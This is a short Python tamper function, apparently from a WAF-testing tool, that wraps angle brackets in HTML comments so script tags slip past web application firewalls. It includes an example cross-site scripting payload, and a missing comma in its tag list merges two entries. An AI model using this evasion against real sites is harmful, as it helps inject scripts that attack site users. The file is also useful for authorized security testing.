__example_payload__ = "'/><script>alert('whatwaf');</script>"
__type__ = "obfuscating script tags with HTML comments'"


def tamper(payload, **kwargs):
    retval = ""
    html_comment = "<!--%-->"
    snipes = ("<", "/>", ">", "t>" "script")
    if not any(s in payload for s in snipes):
        # no point in running it through if there's nothing useful in it
        return payload
    for char in payload:
        if char == ">":
            char = "{}>".format(html_comment)
        elif char == "<":
            char = "<{}".format(html_comment)
        retval += char
    return retval
